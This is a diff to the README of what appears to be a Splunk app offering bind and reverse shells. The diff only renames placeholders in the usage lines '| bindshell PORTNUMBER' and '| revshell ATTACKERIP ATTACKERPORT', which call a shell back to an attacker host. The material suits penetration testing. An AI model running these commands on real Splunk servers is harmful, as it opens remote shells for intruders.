@@ -32,6 +32,6 @@ Once Splunk is restarted click on Permissions for the splunk_shells app. Ensure 
 # Usage
 using each of these shells can be done from the Search and Reporting app. Execute the following searches:
 
-'| bindshell <port number>' The port number can be specified or left off if left off the default is 8888
+'| bindshell PORTNUMBER' The port number can be specified or left off if left off the default is 8888
 
-'| revshell <attack ip> <attack port>' The Attacker IP and Port need to be specified for the shell to call back.
+'| revshell ATTACKERIP ATTACKERPORT' The Attacker IP and Port need to be specified for the shell to call back.
